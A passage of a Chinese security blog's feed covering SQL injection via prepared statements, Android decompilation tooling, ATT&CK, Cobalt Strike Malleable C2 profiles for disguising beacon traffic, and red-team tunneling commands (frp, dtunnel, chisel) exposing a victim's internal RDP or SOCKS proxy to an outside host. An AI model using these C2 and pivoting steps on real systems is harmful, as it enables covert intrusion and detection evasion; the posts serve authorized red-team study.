思考</h2><p>其实吧，结合上一篇总结起来，使用SQL预编译还会造成SQL注入就两个本质：</p><ul><li>模板使用了参数动态拼接，而不是参数绑定：这种情况分两种，第一种是开发是傻逼；第二种是上面的order by这种情况，不得不用动态拼接而他又没做好过滤。</li><li>没有配置好参数和编码，导致可以GBK宽字节绕过：详情看上一篇文章。</li></ul><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>就写一下，因为很久没写了，很简单的问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL预编译失效&quot;&gt;&lt;a href=&quot;#SQL预编译失效&quot; class=&quot;headerlink&quot; title=&quot;SQL预编译失效&quot;&gt;&lt;/a&gt;SQL预编译失效&lt;/h1&gt;&lt;p&gt;之前写了一篇《SQL预编译绕过》，其实这篇也没啥。只是提一下在某些特殊情况下，模板语句处理的
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>AndroidKiller配置</title>
    <link href="http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/</id>
    <published>2020-06-29T14:49:16.000Z</published>
    <updated>2020-06-29T15:23:19.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AndroidKiller配置"><a href="#AndroidKiller配置" class="headerlink" title="AndroidKiller配置"></a>AndroidKiller配置</h1><p>AndroidKiller挺老了，但是用了下真的好方便，加上一些配置后感觉老廉颇了。所以记录一下，后面为了方便我都叫他AK。先贴上吾爱上的工具改造参考贴：<a href="https://www.52pojie.cn/thread-726176-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-726176-1-1.html</a> ，改造的过程根据帖子实现即可。</p><h2 id="0x00-AK连接夜神"><a href="#0x00-AK连接夜神" class="headerlink" title="0x00 AK连接夜神"></a>0x00 AK连接夜神</h2><p>记录一下AK如何通过adb连接到夜神模拟器上。首先我们开启夜神模拟器，然后通过pid号获取到它的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process where (name like &apos;%%Nox.exe%%&apos;) get processid /value</span><br><span class="line">netstat -ano | findstr 11308 | findstr LISTENING</span><br></pre></td></tr></table></figure><blockquote><p>这里获取进程号是直接使用wmic实现的，但也可以手动去任务管理器中找到夜神模拟器的进程号。然后在第二条命令中，将夜神模拟器的进程号替换在第一个管道符后的findstr后即可找到夜神的监听端口号，这里找到的pid是11308。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/1.png" alt></p><p>上图中我们可以找到夜神模拟器的监听端口是26966。然后我们进入到AK的目录，使用AK中的adb的命令连接到刚才我们找到的夜神模拟器的监听端口上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\AndroidKiller\bin\adb</span><br><span class="line">adb.exe connect 127.0.0.1:26966</span><br></pre></td></tr></table></figure><blockquote><p>切记这里使用的是AK中的adb！因为有的人还有自己搭建的adb，包括夜神模拟器中也会有adb，注意区分。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/2.png" alt></p><p>上面显示连接AK成功，然后我们在AK中也可以看到成功搜索到了夜神模拟器：</p><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/3.png" alt></p><h2 id="0x01-夜神模拟器搭建frida"><a href="#0x01-夜神模拟器搭建frida" class="headerlink" title="0x01 夜神模拟器搭建frida"></a>0x01 夜神模拟器搭建frida</h2><p>frida是个无敌的框架，我导师叫我去学习一下。所以这里先记录一下搭建的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ frida frida-tools</span><br></pre></td></tr></table></figure><blockquote><p>这里用了个小trick就是pip安装也是可以通过i参数指定源的，这里选用清华的源就会下载快很多。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/4.png" alt></p><p>然鹅它卡在了安装frida安装的这一步，进行了查阅： <a href="https://www.jianshu.com/p/f91d92ce2b23" target="_blank" rel="noopener">https://www.jianshu.com/p/f91d92ce2b23</a> 。按照帖子的方法进行安装就可以了：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;AndroidKiller配置&quot;&gt;&lt;a href=&quot;#AndroidKiller配置&quot; class=&quot;headerlink&quot; title=&quot;AndroidKiller配置&quot;&gt;&lt;/a&gt;AndroidKiller配置&lt;/h1&gt;&lt;p&gt;AndroidKiller挺老了，但
      
    
    </summary>
    
    
      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>Android反编译工具</title>
    <link href="http://bai-ren-1.github.io/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/"/>
    <id>http://bai-ren-1.github.io/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/</id>
    <published>2020-06-16T13:21:25.000Z</published>
    <updated>2020-06-16T14:00:07.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android反编译工具"><a href="#Android反编译工具" class="headerlink" title="Android反编译工具"></a>Android反编译工具</h1><p>在公司开始学习Android（业务驱动），下午做了两种简单的反编译的做法，这里简答记录一下（好久没写博客了休息一下）</p><h2 id="0x00-apktools"><a href="#0x00-apktools" class="headerlink" title="0x00 apktools"></a>0x00 apktools</h2><p>apktools的项目地址： <a href="https://bitbucket.org/iBotPeaches/apktool/downloads/" target="_blank" rel="noopener">https://bitbucket.org/iBotPeaches/apktool/downloads/</a> 。直接把最新版本的jar文件下载到本地，然后我们cd到apktools目录中使用下面命令就能看到使用说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool_2.4.1.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/1.png" alt></p><p>然后我们指定d参数就能进行反编译啦：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/2.png" alt></p><p>然后我们就能在当前目录下看到反编译出来的文件夹结果：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/3.png" alt></p><p>可以看到反编译出来的是smali语言：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/4.png" alt></p><h2 id="0x01-dex2jar搭配-jd-gui"><a href="#0x01-dex2jar搭配-jd-gui" class="headerlink" title="0x01 dex2jar搭配 jd-gui"></a>0x01 dex2jar搭配 jd-gui</h2><p>将安装包shabi.apk后缀改为.zip，解压后拷贝classes.dex文件到dex2jar文件目录下，</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/5.png" alt></p><p>cmd进入改目录，执行下面命令，会生成classes-dex2jar.jar文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/6.png" alt></p><p>使用 jd-gui 打开生成的jar.jar文件就能看到反编译出来的代码啦：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/7.png" alt></p><p>这里看到的就是java代码啦，还是方便很多的。</p><h2 id="0x02-小结"><a href="#0x02-小结" class="headerlink" title="0x02 小结"></a>0x02 小结</h2><p>很简单的内容，记录一下练手。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Android反编译工具&quot;&gt;&lt;a href=&quot;#Android反编译工具&quot; class=&quot;headerlink&quot; title=&quot;Android反编译工具&quot;&gt;&lt;/a&gt;Android反编译工具&lt;/h1&gt;&lt;p&gt;在公司开始学习Android（业务驱动），下午做了两种简单的
      
    
    </summary>
    
    
      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK</title>
    <link href="http://bai-ren-1.github.io/2020/05/01/ATT&amp;CK/"/>
    <id>http://bai-ren-1.github.io/2020/05/01/ATT&amp;CK/</id>
    <published>2020-05-01T08:45:00.000Z</published>
    <updated>2020-05-03T10:27:34.380Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK"><a href="#ATT-amp-CK" class="headerlink" title="ATT&amp;CK"></a>ATT&amp;CK</h1><p>ATT&amp;CK在正式从事蓝军攻击队工作之前就一直有看过，但不知其所以然。现在对其有了一定的认识，就在这里浅析一下ATT&amp;CK。</p><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>以前以为ATT&amp;CK是玩了安全中最喜欢的字符替换，代表着ATTACK，但实际并非如此。ATT&amp;CK的定义如下：</p><blockquote><p> ATT&amp;CK（ Adversarial Tactics, Techniques, and Common Knowledge）是一个反映各个攻击生命周期的攻击行为的模型和知识库。 根据英文直译过来代表的就是“<strong>对抗技术、对抗技巧和常识</strong>”。</p></blockquote><p>所以呢，我们能看到其实ATT&amp;CK是一个<strong>攻击模型知识库</strong>，用来反映一次完整攻击的生命周期。</p><p>当然，不同的政企单位对ATT&amp;CK的定制是不尽相同的。有的把攻击划分为3阶段，有的是7阶段乃至9阶段。但毫无疑问的是，更多的覆盖到黑客的攻击手法，我们就能更全面地进行相应的防护。</p><h2 id="0x01-蓝军？红队？"><a href="#0x01-蓝军？红队？" class="headerlink" title="0x01 蓝军？红队？"></a>0x01 蓝军？红队？</h2><p>说起红蓝对抗，绝大多数的安全从业者肯定是毫不陌生的。大多人认为蓝色就是防守的，红色都是进攻的。但实际的情况应该是这样的：</p><blockquote><p>红军作为企业防守方，通过安全加固、攻击监测、应急处置等手段来保障企业安全，而蓝军作为攻击方，以发现安全漏洞，获取业务权限或数据为目标，利用各种攻击手段，试图绕过红军层层防护，达成既定目标。</p></blockquote><p>欧美采用红队（Red Team）代表攻击方，蓝队（Blue Team）代表防守方，颜色代表正好相反，常常容易让大家搞混。即蓝军 = 红队 = 攻击方。 </p><h2 id="0x02-MITRE-ATT-amp-CK"><a href="#0x02-MITRE-ATT-amp-CK" class="headerlink" title="0x02 MITRE ATT&amp;CK"></a>0x02 MITRE ATT&amp;CK</h2><p>MITRE ATT&amp;CK应该是最流量的攻击模型了。 MITRE是啥？</p><blockquote><p>MITRE是美国非盈利组织，除了协助进行多项网络安全相关研究，同时，也是运维CVE漏洞数据库背后的组织，而ATT&amp;CK框架的研究计划，是该组织在2015年5月发起。 </p></blockquote><p>这么牛逼的组织，他们构建的ATT&amp;CK架构自然有一定的借鉴和学习的地方。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://paper.seebug.org/867/" target="_blank" rel="noopener">https://paper.seebug.org/867/</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ATT-amp-CK&quot;&gt;&lt;a href=&quot;#ATT-amp-CK&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK&lt;/h1&gt;&lt;p&gt;ATT&amp;amp;CK在正式从事蓝军攻击队工作之前就一直有看过，但不知其所以然
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Malleable_C2_Profile</title>
    <link href="http://bai-ren-1.github.io/2020/04/16/Malleable_C2_Profile/"/>
    <id>http://bai-ren-1.github.io/2020/04/16/Malleable_C2_Profile/</id>
    <published>2020-04-16T08:55:13.000Z</published>
    <updated>2020-06-29T13:13:37.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Malleable-C2-Profile"><a href="#Malleable-C2-Profile" class="headerlink" title="Malleable_C2_Profile"></a>Malleable_C2_Profile</h1><p>Malleable_C2_Profile是CobaltStrike中一种配置文件。目的是用来伪装流量，让通讯更加隐蔽。下面贴上  <a href="https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikekuo-zhan/malleable-c2.html" target="_blank" rel="noopener">https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikekuo-zhan/malleable-c2.html</a>  上的解释。</p><blockquote><p>Cobalt Strike的 Malleable-C2-Profiles配置文件是用来伪装流量，让通讯更加隐蔽和控制其行为的一种方式。</p><p>Beacon中使用http通信的payload由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。</p></blockquote><h2 id="0x00-加载方式"><a href="#0x00-加载方式" class="headerlink" title="0x00 加载方式"></a>0x00 加载方式</h2><p>首先贴上别人制作好的混淆profile，<a href="https://github.com/rsmudge/Malleable-C2-Profiles。加载profile的方式也很简单，在开启CobaltStrike（下面简称：CS）的命令时，在ip和密码后加上你的profile的路径就能让服务器通信时使用profile进行流量混淆达成隐藏的目的。如下所示：" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles。加载profile的方式也很简单，在开启CobaltStrike（下面简称：CS）的命令时，在ip和密码后加上你的profile的路径就能让服务器通信时使用profile进行流量混淆达成隐藏的目的。如下所示：</a></p><ul><li>启动CS的teamserver时同时加载Malleable-C2-Profiles命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [external IP] [password] [/path/to/my.profile]</span><br></pre></td></tr></table></figure><ul><li>检查预览Profiles文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint [/path/to/my.profile]</span><br></pre></td></tr></table></figure><h2 id="0x01-使用实例"><a href="#0x01-使用实例" class="headerlink" title="0x01 使用实例"></a>0x01 使用实例</h2><p>因为是在公司的资产上进行攻击的，这里就不放上截图了。稍微记录一下手法就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CS服务器：10.100.19.19</span><br><span class="line">CS客户端：10.100.19.19</span><br><span class="line">受害机：20.100.0.25</span><br></pre></td></tr></table></figure><p>首先启动CS服务器，这里假设使用的混淆profile名为amazon.profile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS服务器：</span><br><span class="line">./teamserver 10.100.19.19 123456 /opt/malleable_C2_profile/amazon.profile</span><br></pre></td></tr></table></figure><p>然后我们在同一部主机另开终端连接CS服务，成为CS客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS客户端</span><br><span class="line">./start.sh 10.100.19.19 123456</span><br></pre></td></tr></table></figure><p>然后CS就会执行进入图形化界面。直接使用默认的端口和用户名密码点击connect进入CS页面。我们要给受害机开启一个监听端口，点击“CobaltStrike -&gt; listeners”，然后选择参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Name：didi</span><br><span class="line">Paylaod：Beacon Http</span><br><span class="line">HTTP Hosts：10.10.19.19</span><br><span class="line">HTTP Hosts（Stager）：10.10.19.19</span><br><span class="line">Profile:defualt</span><br><span class="line">HTTP Port(C2):80</span><br></pre></td></tr></table></figure><p>这样就就在CS服务器上开启了80端口监听受害机流量啦，并且通过http形式进行传输。我们现在要生成控制客户端的恶意软件，这里有很多种形式。下面是参考链接：<a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/102725129</a> </p><p>这里我继续我自己的做法，我想生成一个受害机上运行的恶意文件。点击“Attack -&gt; Packeges -&gt; Windows Executables”，然后选择刚刚添加的监听并点击Generate进行构建。然后我们将输出的exe上传到受害主机上，只要受害机一点击，马上就能在CS上上线。</p><p>然后因为我们选择了profile，所以抓包观察的话能看到，通信请求都被伪造成对amazon的请求，能在一定程度上达成混淆视听的作用。</p><h2 id="0x02-随机profile"><a href="#0x02-随机profile" class="headerlink" title="0x02 随机profile"></a>0x02 随机profile</h2><p>因为这个profile库已经发布很久了，我个人感觉肯定很多对其进行样本添加了，那我们应该对其进行随机化进行绕检测。</p><p>工具链接：<a href="https://github.com/bluscreenofjeff/Malleable-C2-Randomizer。因为今天在公司上打了一份详细使用，这里就不详细写了，就稍微记录一下简单的命令即可：" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Malleable-C2-Randomizer。因为今天在公司上打了一份详细使用，这里就不详细写了，就稍微记录一下简单的命令即可：</a></p><ul><li>模板的具体样本的生成<ul><li>我们可以使用它给我们的模板（/sample template），然后执行“python malleable-c2-randomizer.py -profile /opt/Malleable-C2-Randomizer/amazon.profile -count 2 -cobalt /opt/cobaltstrike4.0 -output shabi”直接生成它预设的模板的2个样本。</li><li>我们也可以自己在想改的地方改成“%%wordlist%%”，然后执行“python malleable-c2-randomizer.py -profile /opt/Malleable-C2-Randomizer/amazon.profile -count 1 -cobalt /opt/cobaltstrike4.0 -wordlist /opt/hostname.txt -output shabi”（/opt/hostname.txt里面就是自己写好的想要替换进去模板种的%%wordlist%%的具体内容）生成我们需要的模板的1个样本。</li></ul></li><li>然后根据上一章节一样的启动方法，把指定profile路径的那个位置修改为刚刚Randomize生成新的profile的路径，然后启动即可。</li></ul><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>CS是今天第一次接触，就这个隐藏通信流量就已经感觉到了他的强大之处，继续努力变得更强。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Malleable-C2-Profile&quot;&gt;&lt;a href=&quot;#Malleable-C2-Profile&quot; class=&quot;headerlink&quot; title=&quot;Malleable_C2_Profile&quot;&gt;&lt;/a&gt;Malleable_C2_Profile&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>红队代理工具</title>
    <link href="http://bai-ren-1.github.io/2020/04/16/%E7%BA%A2%E9%98%9F%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    <id>http://bai-ren-1.github.io/2020/04/16/%E7%BA%A2%E9%98%9F%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/</id>
    <published>2020-04-16T08:45:00.000Z</published>
    <updated>2020-06-16T13:28:10.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红队代理工具"><a href="#红队代理工具" class="headerlink" title="红队代理工具"></a>红队代理工具</h1><p>好久没写博客了，最近一直复现各类代理和隧道的使用并且抓取通信流量进行分析。写这个文章，一是为了总结用法，而是为了记录工作的进展。</p><h2 id="0x00-frp"><a href="#0x00-frp" class="headerlink" title="0x00 frp"></a>0x00 frp</h2><p>frp需要三台主机，一台内网受害机，一台外网服务机，一台外网攻击访问机。</p><ul><li>服务端配置frps.ini监听端口，然后./frps -c ./frps.ini开启监听。</li><li>客户端配置frpc.ini服务端地址和端口和使用的协议，然后./frpc -c ./frpc.ini开启。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li><li><input checked disabled type="checkbox"> stcp</li></ul><blockquote><p>开启kali服务端./frps -c ./frps.ini。根据github的wiki上的配置，使用./frpc -c ./frpc.ini让受害机连接到kali。然后根据github的wiki上的配置，使用./frpc -c ./frpc让访问机连接到kali。然后访问机访问配置中自己本地的端口即可连接到受害机上</p></blockquote><ul><li><input checked disabled type="checkbox"> xtcp</li></ul><blockquote><p>首先根据wiki在服务端的./frps.ini添加udp的监听端口。然后开启kali服务端./frps -c ./frps.ini。根据github的wiki上的配置，使用./frpc -c ./frpc.ini让受害机连接到kali。然后根据github的wiki上的配置，使用./frpc -c ./frpc让访问机连接到kali。然后访问机访问配置中自己本地的端口即可连接到受害机上</p></blockquote><h2 id="0x01-fcn"><a href="#0x01-fcn" class="headerlink" title="0x01 fcn"></a>0x01 fcn</h2><p>fcn需要两台主机，一台内网受害机，一台外网攻击机（其客户端和服务端与其他相反）。</p><ul><li>在内网主机上开启fcn后点击服务端，配置好密码并开启服务。</li><li>在外网攻击机上开启fcn后点击客户端，配置好名称和ID密码等后等待连接成功。</li><li>连接成功后外网主机就能直接mstsc连接到内网主机上。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> <p>tcp</p></li><li><input checked disabled type="checkbox"> <p>udp</p></li><li><input disabled type="checkbox"> <p>tls</p></li></ul><h2 id="0x02-ngrok"><a href="#0x02-ngrok" class="headerlink" title="0x02 ngrok"></a>0x02 ngrok</h2><p>ngrok需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在ngrok官网申请个人账号，然后记录自己的token，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机的cmd上按格式使用命令ngrok tcp 3389就能把本地远程桌面映射到ngrok提供的域名的端口上。</li><li>在攻击机上mstsc到ngrok提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li></ul><h2 id="0x03-sunny-ngrok"><a href="#0x03-sunny-ngrok" class="headerlink" title="0x03 sunny-ngrok"></a>0x03 sunny-ngrok</h2><p>sunny-ngrok需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在ngrok官网申请个人账号，并开通隧道获取隧道ID，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机上使用客户端按官网wiki的格式执行命令。其中隧道ID用于启动隧道，就能把本地远程桌面映射到sunny-ngrok提供的域名端口上。</li><li>在攻击机上mstsc到sunny-ngrok提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li></ul><h2 id="0x04-natapp"><a href="#0x04-natapp" class="headerlink" title="0x04 natapp"></a>0x04 natapp</h2><p>natapp需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在natapp官网申请个人账号，并获取authtoken，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机上运行客户端，通过指定authtoken启动隧道，就能把本地远程桌面映射到natapp提供的域名端口上。</li><li>在攻击机上mstsc到natapp提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><h2 id="0x05-小米球"><a href="#0x05-小米球" class="headerlink" title="0x05 小米球"></a>0x05 小米球</h2><p>小米球需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在小米球官网申请个人账号，下载客户端。</li><li>将客户端上传到受害机上，在yml配置文件里面写好映射的本地端口和隧道名，使用cmd按官网教程格式运行命令，小米球就能把本地远程桌面映射到natapp提供的域名端口上。</li><li>在攻击机上mstsc到natapp提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><h2 id="0x06-nps"><a href="#0x06-nps" class="headerlink" title="0x06 nps"></a>0x06 nps</h2><p>nps的tcp和udp需要三台主机，一台内网受害机，一台外网攻击机，一台外网服务器。</p><ul><li>在外网服务器上开启nps服务，然后进入web页面进行客户端添加和tcp隧道的建立。</li><li>在内网服务器上开启nps服务，连接到外网服务器。</li><li>在外网攻击机上mstsc外网服务器的端口就能连接到内网的3389。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><p><strong>sock代理做法</strong></p><p>nps的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启nps，然后在web页面开启自己的代理监听端口。</li><li>在受害机上开启npc，然后连接到外网服务器上。</li><li>在攻击机上用proxifier将外网服务器的监听端口添加到代理服务器中，然后找到mstsc<strong>右键</strong>，使用proxifier运行，然后连输入内网主机ip即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> sock</li></ul><p>其他基本做法都大同小异，可以看下面的参考</p><p> <a href="https://maizer.pw/index.php/archives/37/" target="_blank" rel="noopener">https://maizer.pw/index.php/archives/37/</a> </p><p> <a href="https://maizer.pw/index.php/archives/50/" target="_blank" rel="noopener">https://maizer.pw/index.php/archives/50/</a> </p><p> <a href="https://www.moerats.com/archives/891/" target="_blank" rel="noopener">https://www.moerats.com/archives/891/</a> </p><h2 id="0x07-花生壳"><a href="#0x07-花生壳" class="headerlink" title="0x07 花生壳"></a>0x07 花生壳</h2><p>同上面ngrok系列的做法，因为做了很久就不记录了。</p><h2 id="0x08-狗洞"><a href="#0x08-狗洞" class="headerlink" title="0x08 狗洞"></a>0x08 狗洞</h2><p>狗洞的tcp和udp需要三台主机，一台内网受害机，一台外网攻击机，一台外网服务器。</p><ul><li>在外网服务机上开启狗洞服务，./dtunnel_lite -service 10.100.19.19:1234 -v -xor 12345 (默认udp，<strong>-tcp</strong>指定使用tcp)</li><li>在内网受害机上开启狗洞服务，这里注意需要 <strong>-r 指定反向模式才能反向端口映射</strong>使得内网的3389映射到外网服务器上，dtunnel_lite -service 10.100.19.19:1234 -v -action 127.0.0.1:3389 -encrypt -xor 12345 -local:6666 -r(默认udp，-tcp指定使用tcp)</li><li>在外网攻击机上mstsc外网服务器的6666端口就能连接到内网的3389。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input checked disabled type="checkbox"> udp</li></ul><p><strong>反向sock5代理做法</strong></p><p>狗洞的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启狗洞服务，./dtunnel_lite -service 10.100.19.19:1234 -v -xor 12345</li><li>在受害机上开启狗洞服务，这里注意需要 <strong>-r 指定反向模式才能反向代理</strong>使得设置内网机器的反向代理机器为外网服务器，dtunnel_lite -service 10.100.19.19:1234 -v -action  socks5 -encrypt -xor 12345 -local:8787 -r</li><li>在攻击机上用proxifier将外网服务器的10.100.19.19和反向监听端口8787添加到代理服务器中，然后找到mstsc<strong>右键使用proxifier运行</strong>，然后连输入内网主机ip即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> sock5</li></ul><h2 id="0x09-Chisel"><a href="#0x09-Chisel" class="headerlink" title="0x09 Chisel"></a>0x09 Chisel</h2><p>官方文档就是一坨屎，这两个个链接不错： </p><p><a href="https://www.puckiestyle.nl/pivot-with-chisel/" target="_blank" rel="noopener">https://www.puckiestyle.nl/pivot-with-chisel/</a> </p><p><a href="https://www.cnblogs.com/heycomputer/articles/10697828.html" target="_blank" rel="noopener">https://www.cnblogs.com/heycomputer/articles/10697828.html</a> </p><p>chisel的tcp需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在外网攻击机上开启监听端口，chisel server -p 1111 -reverse。</li><li>在内网受害机上将本地端口反向映射到外网攻击机上，chisel client 10.100.19.30:1111 R:2222：127.0.0.1:3389。</li><li>在外网攻击机上自己日自己的2222端口即可访问到内网受害机，mstsc 127.0.0.1:2222。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li></ul><p><strong>sock5代理做法</strong></p><p>chisel的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启chisel服务，chisel server -p 1111 -reverse，开启<strong>建立连接</strong>的监听端口。</li><li>在内网受害机上连接并开启<strong>反向sock5</strong>服务，chisel client 10.100.19.30:1111 5555:socks，让服务器的5555端口开启sock5，<strong>反向代理</strong>访问内网受害机的流量。</li><li>在外网攻击机上连接20.100.0.25，内网响应后传给反向代理服务器即外网服务器，然后外网服务器和外网攻击机都在外能能通信，所以就能成功连接。</li></ul><p>未成功，应该是反向代理没设置好。</p><ul><li><input disabled type="checkbox"> sock</li></ul><h2 id="0x10-小结"><a href="#0x10-小结" class="headerlink" title="0x10 小结"></a>0x10 小结</h2><p>工具用法何其多，这些并不是重要的。最重要的是，我们要知道里面的原理，然后通过工具去积累思路，尝试自己去写出这样的工具，才是真正的学习呐~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;红队代理工具&quot;&gt;&lt;a href=&quot;#红队代理工具&quot; class=&quot;headerlink&quot; title=&quot;红队代理工具&quot;&gt;&lt;/a&gt;红队代理工具&lt;/h1&gt;&lt;p&gt;好久没写博客了，最近一直复现各类代理和隧道的使用并且抓取通信流量进行分析。写这个文章，一是为了总结用法，而是
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
